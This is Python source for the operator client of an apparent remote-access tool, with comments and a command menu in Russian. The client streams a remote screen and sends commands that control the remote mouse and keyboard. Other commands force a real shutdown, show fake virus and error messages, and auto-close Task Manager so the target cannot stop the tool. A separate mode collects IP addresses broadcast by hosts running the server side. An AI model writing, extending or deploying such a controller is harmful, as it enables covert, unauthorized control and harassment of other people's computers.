import socket
import cv2
import numpy as np
import zlib
import threading
import time
import keyboard  # Новая библиотека для перехвата клавиш
import sys
import struct

class ScreenReceiver(threading.Thread):
    def __init__(self, sock):
        threading.Thread.__init__(self)
        self.sock = sock
        self.running = True
        self.lock = threading.Lock()
    
    def stop(self):
        with self.lock:
            self.running = False
    
    def is_running(self):
        with self.lock:
            return self.running
    
    def run(self):
        while self.is_running():
            try:
                self.sock.settimeout(2.0)
                size_bytes = self.sock.recv(4)
                if not size_bytes:
                    print("Server closed connection")
                    self.stop()
                    break
                    
                size = int.from_bytes(size_bytes, 'big')
                received = 0
                chunks = []
                
                while received < size and self.is_running():
                    try:
                        chunk = self.sock.recv(min(size - received, 4096))
                        if not chunk:
                            break
                        chunks.append(chunk)
                        received += len(chunk)
                    except socket.timeout:
                        if not self.is_running():
                            break
                        continue
                
                if len(chunks) == 0:
                    self.stop()
                    break
                    
                compressed = b''.join(chunks)
                img_data = zlib.decompress(compressed)
                img = cv2.imdecode(np.frombuffer(img_data, np.uint8), cv2.IMREAD_COLOR)
                
                if img is not None:
                    cv2.imshow("Remote Screen", img)
                    cv2.waitKey(1)
                
            except socket.timeout:
                if not self.is_running():
                    break
                continue
            except ConnectionResetError:
                print("Connection reset by server")
                self.stop()
                break
            except Exception as e:
                print(f"Screen receive error: {e}")
                self.stop()
                break

        cv2.destroyAllWindows()

class KeyboardCapture:
    def __init__(self, sock):
        self.sock = sock
        self.capturing = False
        self.hook = None
    
    def start_capture(self):
        if self.capturing:
            return
        
        self.capturing = True
        print("Keyboard capture started. Press ESC to stop.")
        
        def on_key_event(e):
            if not self.capturing:
                return False
                
            if e.event_type == keyboard.KEY_DOWN:
                if e.name == 'esc':  # ESC останавливает захват
                    self.stop_capture()
                    return False
                    
                try:
                    # Отправляем нажатую клавишу на сервер
                    key = e.name
                    if len(key) == 1:  # Буквы/цифры
                        self.sock.sendall(f"key {key}".encode())
                    else:  # Специальные клавиши
                        self.sock.sendall(f"special_key {key}".encode())
                except Exception as e:
                    print(f"Error sending key: {e}")
                    self.stop_capture()
                    return False
        
        self.hook = keyboard.hook(on_key_event)
    
    def stop_capture(self):
        if not self.capturing:
            return
            
        self.capturing = False
        if self.hook:
            keyboard.unhook(self.hook)
        print("Keyboard capture stopped")

class CommandSender(threading.Thread):
    def __init__(self, sock, screen_receiver):
        threading.Thread.__init__(self)
        self.sock = sock
        self.screen_receiver = screen_receiver
        self.running = True
        self.command_delay = 0.1
        self.lock = threading.Lock()
        self.keyboard_capture = KeyboardCapture(sock)
    
    def stop(self):
        with self.lock:
            self.running = False
        self.keyboard_capture.stop_capture()
    
    def is_running(self):
        with self.lock:
            return self.running
    
    def run(self):
        print("\nAvailable commands:")
        print("screenshot - получить скриншот")
        print("move x y - переместить курсор")
        print("click left/right - клик мышью")
        print("automove [speed] - авто-движение (скорость 0.01-1.0)")
        print("autoclick [interval] - авто-клики (интервал в секундах)")
        print("rick - открыть CMD с анимацией Rick Astley")
        print("fake_virus - показать фейковое сообщение о вирусе")
        print("shutdown - завершить работу Windows (настоящее выключение)")
        print("fake_error - показать фейковое сообщение об ошибке")
        print("reverse_mouse - переключить обратное управление мышью")
        print("type <text> - ввести текст на сервере")
        print("open <url> - открыть ссылку в браузере")
        print("key X - нажать клавишу X")
        print("keyboard_capture - перехватить клавиатуру (ESC для выхода)")
        print("block_taskmgr - автозакрытие диспетчера задач")
        print("exit - отключиться")
        print("\nYou can send multiple commands at once by separating them with semicolons (;).")
        
        try:
            while self.is_running() and self.screen_receiver.is_running():
                try:
                    cmd_input = input("Command(s): ").strip()
                    if not cmd_input:
                        continue
                    
                    commands = [c.strip() for c in cmd_input.split(';') if c.strip()]
                    
                    for cmd in commands:
                        if not self.is_running() or not self.screen_receiver.is_running():
                            break
                            
                        if cmd == "exit":
                            self.stop()
                            self.screen_receiver.stop()
                            try:
                                self.sock.sendall(cmd.encode())
                            except:
                                pass
                            break
                        elif cmd == "keyboard_capture":
                            self.keyboard_capture.start_capture()
                            continue
                        
                        try:
                            print(f"Sending: {cmd}")
                            self.sock.sendall(cmd.encode())
                            
                            if cmd == "reverse_mouse":
                                try:
                                    response = self.sock.recv(1024)
                                    print(response.decode())
                                except:
                                    print("Failed to get response for reverse_mouse")
                                    raise
                            
                            if len(commands) > 1:
                                time.sleep(self.command_delay)
                                
                        except ConnectionResetError:
                            print("Connection reset while sending command")
                            self.stop()
                            self.screen_receiver.stop()
                            break
                        except Exception as e:
                            print(f"Error sending command '{cmd}': {e}")
                            continue
                            
                except KeyboardInterrupt:
                    print("\nDisconnecting...")
                    self.stop()
                    self.screen_receiver.stop()
                    try:
                        self.sock.sendall("exit".encode())
                    except:
                        pass
                    break
                    
        except Exception as e:
            print(f"Command error: {e}")
            self.stop()
            self.screen_receiver.stop()

def multicast_recv():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))  # Google's public DNS
    local_ip = s.getsockname()[0]
    s.close()
    
    if local_ip != "172.16.79.23":
        print("не с того компа запускаешь, нужен который 172.16.79.23")
        return

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((local_ip, 45631))
    
    while True:
        data, address = sock.recvfrom(4096)
        print(f"Received message: {data.decode('utf-8')}")

def get_valid_ip():
    """Функция для проверки правильности IP-адреса"""
    while True:
        ip = input("Enter server IP (or 'localhost' for local connection): ").strip()
        if ip.lower() == 'localhost':
            return '127.0.0.1'
        try:
            socket.inet_aton(ip)
            return ip
        except socket.error:
            print("Invalid IP address format. Please try again.")

def main():
    PORT = 65432
    
    # Проверяем наличие библиотеки keyboard
    try:
        import keyboard
    except ImportError:
        print("Error: Required library 'keyboard' not found.")
        print("Please install it with: pip install keyboard")
        sys.exit(1)
    
    mode = input("1 to connect, 2 to receive ips: ")
    
    if mode == "2":
        multicast_recv()
    elif mode == "1":
        while True:
            try:
                HOST = get_valid_ip()
                
                print(f"Attempting to connect to {HOST}:{PORT}...")
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(5)
                    try:
                        s.connect((HOST, PORT))
                        print(f"Successfully connected to {HOST}:{PORT}")
                        
                        receiver = ScreenReceiver(s)
                        command_sender = CommandSender(s, receiver)
                        
                        receiver.start()
                        command_sender.start()
                        
                        receiver.join()
                        command_sender.join()
                        
                        break
                        
                    except socket.timeout:
                        print(f"Connection timed out. Server may be down or IP {HOST} is incorrect.")
                    except ConnectionRefusedError:
                        print(f"Connection refused. Make sure server is running on {HOST}:{PORT}")
                    except Exception as e:
                        print(f"Connection error: {e}")
                    
            except Exception as e:
                print(f"Fatal error: {e}")
                break
                
            retry = input("Would you like to try again? (y/n): ").lower()
            if retry != 'y':
                break

        cv2.destroyAllWindows()

if __name__ == "__main__":
    main()
